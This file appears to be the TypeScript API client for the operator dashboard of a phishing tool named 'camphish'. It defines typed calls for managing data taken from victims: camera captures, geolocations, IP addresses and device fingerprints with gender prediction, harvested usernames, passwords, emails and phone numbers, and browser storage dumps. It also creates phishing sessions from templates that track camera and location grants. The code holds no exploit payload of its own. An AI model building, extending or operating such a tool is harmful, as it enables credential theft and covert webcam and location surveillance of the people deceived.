const API = '/api'

/* ───── Optional M2M auth (localStorage overrides) ───── */
function authHeaders(): HeadersInit {
  const h: Record<string, string> = { 'X-Requested-With': 'XMLHttpRequest' }
  const apiKey = localStorage.getItem('camphish-api-key')
  if (apiKey) {
    h['X-API-Key'] = apiKey
  }
  const bearer = localStorage.getItem('camphish-bearer-token')
  if (bearer) {
    h['Authorization'] = `Bearer ${bearer}`
  }
  return h
}

function mergeHeaders(base: HeadersInit | undefined): HeadersInit {
  const merged = new Headers(authHeaders())
  if (base) {
    const b = new Headers(base)
    b.forEach((v, k) => merged.set(k, v))
  }
  return merged
}

async function handleAuthError(r: Response): Promise<string> {
  if (r.status === 401 || r.status === 403) {
    const body = await r.text().catch(() => '')
    try {
      const json = JSON.parse(body)
      if (json.message) return `${r.status}: ${json.message}`
    } catch { /* not json */ }
    return `${r.status}: Authentication required — please log in with a valid access code or configure an API key/OAuth token.`
  }
  return ''
}

async function fetchJson<T>(url: string): Promise<T> {
  const r = await fetch(url, { headers: authHeaders() })
  if (!r.ok) {
    const authMsg = await handleAuthError(r)
    if (authMsg) throw new Error(authMsg)
    const body = await r.text().catch(() => '')
    throw new Error(body ? `${r.status}: ${body.slice(0, 200)}` : `${r.status} ${r.statusText}`)
  }
  return r.json()
}

async function fetchNoContent(url: string, init: RequestInit): Promise<void> {
  const r = await fetch(url, { ...init, headers: mergeHeaders(init.headers) })
  if (!r.ok) {
    const authMsg = await handleAuthError(r)
    if (authMsg) throw new Error(authMsg)
    const body = await r.text().catch(() => '')
    throw new Error(body ? `${r.status}: ${body.slice(0, 200)}` : `${r.status} ${r.statusText}`)
  }
}

export interface Stats {
  total_captures: number
  total_locations: number
  total_ips: number
  unique_ips: number
  total_size_bytes: number
  total_size_mb: number
  first_capture: number | null
  last_capture: number | null
  total_credentials: number
  total_storage_dumps: number
}

export interface Capture {
  id: string
  session_id: string
  filename: string
  file_type: string
  file_size: number
  created_at: number
  url: string
}

export interface PaginatedCaptures {
  captures: Capture[]
  total: number
  page: number
  per_page: number
  pages: number
}

export interface Location {
  id: string
  session_id: string
  latitude: number
  longitude: number
  accuracy: number | null
  address: string | null
  created_at: number
  maps_url: string
}

export interface IpEntry {
  id: string
  session_id: string
  ip_address: string
  user_agent: string | null
  device: string | null
  browser: string | null
  os: string | null
  city: string | null
  country: string | null
  local_ip: string | null
  screen_resolution: string | null
  language: string | null
  platform: string | null
  timezone: string | null
  gender_prediction: string | null
  gender_confidence: number | null
  fingerprint_data: Record<string, unknown> | null
  created_at: number
}

export interface IpStats {
  entries: IpEntry[]
  total: number
  unique_ips: number
  has_more: boolean
  device_breakdown: Record<string, number>
  browser_breakdown: Record<string, number>
  os_breakdown: Record<string, number>
}

export interface Template {
  id: string
  name: string
  description: string | null
  total_served: number
  total_camera_grants: number
  total_location_grants: number
  created_at: number
}

export interface Session {
  id: string
  name: string
  template_id: string
  status: string
  created_at: number
}

export interface EventRow {
  id: string
  session_id: string
  event_type: string
  event_data: any
  created_at: number
}

export interface PaginatedResponse<T> {
  entries: T[]
  total: number
  has_more: boolean
}

export interface StorageDump {
  id: string
  session_id: string
  ip_address: string | null
  data: any
  created_at: number
}

export interface Credential {
  id: string
  session_id: string
  template_id: string | null
  username: string | null
  password: string | null
  email: string | null
  phone: string | null
  ip_address: string | null
  created_at: number
}

export const api = {
  stats: () => fetchJson<Stats>(`${API}/stats`),
  captures: (page = 1, perPage = 60, sort = 'newest') =>
    fetchJson<PaginatedCaptures>(`${API}/captures?page=${page}&per_page=${perPage}&sort=${sort}`),
  deleteCapture: (id: string) =>
    fetchNoContent(`${API}/captures/${id}`, { method: 'DELETE' }),
  deleteAllCaptures: () =>
    fetchNoContent(`${API}/captures`, { method: 'DELETE' }),
  locations: (offset = 0, limit = 50, session = '') =>
    fetchJson<PaginatedResponse<Location>>(`${API}/locations?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
  deleteAllLocations: () => fetchNoContent(`${API}/locations`, { method: 'DELETE' }),
  ips: (offset = 0, limit = 50, session = '') =>
    fetchJson<IpStats>(`${API}/ips?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
  deleteAllIps: () => fetchNoContent(`${API}/ips`, { method: 'DELETE' }),
  templates: () => fetchJson<Template[]>(`${API}/templates`),
  events: (session = '', offset = 0, limit = 50) =>
    fetchJson<PaginatedResponse<EventRow>>(`${API}/events?${session ? `session=${session}&` : ''}offset=${offset}&limit=${limit}`),
  deleteAllEvents: () => fetchNoContent(`${API}/events`, { method: 'DELETE' }),
  sessions: () => fetchJson<Session[]>(`${API}/sessions`),
  createSession: (name: string, templateId: string): Promise<Session> =>
    fetch(`${API}/sessions`, {
      method: 'POST',
      headers: mergeHeaders({ 'Content-Type': 'application/json' }),
      body: JSON.stringify({ name, template_id: templateId })
    }).then(async r => {
      if (!r.ok) {
        const authMsg = await handleAuthError(r)
        if (authMsg) throw new Error(authMsg)
        throw new Error('Failed to create session')
      }
      return r.json()
    }),
  deleteSession: (id: string) => fetchNoContent(`${API}/sessions/${id}`, { method: 'DELETE' }),
  credentials: (offset = 0, limit = 50, session = '') =>
    fetchJson<PaginatedResponse<Credential>>(`${API}/credentials?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
  deleteCredential: (id: string) => fetchNoContent(`${API}/credentials/${id}`, { method: 'DELETE' }),
  deleteAllCredentials: () => fetchNoContent(`${API}/credentials`, { method: 'DELETE' }),
  storage: (offset = 0, limit = 50, session = '') =>
    fetchJson<PaginatedResponse<StorageDump>>(`${API}/storage?offset=${offset}&limit=${limit}${session ? `&session=${session}` : ''}`),
  deleteStorage: (id: string) => fetchNoContent(`${API}/storage/${id}`, { method: 'DELETE' }),
  deleteAllStorage: () => fetchNoContent(`${API}/storage`, { method: 'DELETE' }),
}
